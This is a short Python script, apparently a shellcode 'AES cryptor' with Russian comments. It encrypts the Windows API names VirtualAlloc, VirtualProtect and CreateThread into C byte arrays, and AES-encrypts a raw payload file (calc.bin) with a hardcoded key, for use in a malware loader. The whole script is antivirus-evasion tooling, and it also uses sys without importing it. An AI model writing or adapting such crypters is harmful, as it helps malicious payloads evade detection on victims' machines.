import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def win_aes_encrypt(plaintext_bytes, password_str):
    key_bytes = hashlib.sha256(password_str.encode('utf-8')).digest()
    padded_data = pad(plaintext_bytes, AES.block_size)

    cipher = AES.new(key_bytes, AES.MODE_ECB)
    ciphertext = cipher.encrypt(padded_data)
    return ciphertext

key = "123"
functions = ['VirtualAlloc', 'VirtualProtect', 'CreateThread']

for f in functions:
    string_with_null = f.encode('utf-8') + b'\0'
    encrypted = win_aes_encrypt(string_with_null, key)
    hex_format = ','.join(f"0x{b:02x}" for b in encrypted)
    print(f"unsigned char s{f}[] = {{{hex_format}}}; // Длина массива: {len(encrypted)} байт")

try:
    file = open("calc.bin", "rb")
    content = file.read()
except:
    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
    sys.exit()
    
def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext

cipher = AESencrypt(content, key.encode())

with open("aes_calc.bin", "wb") as fa:
    fa.write(cipher)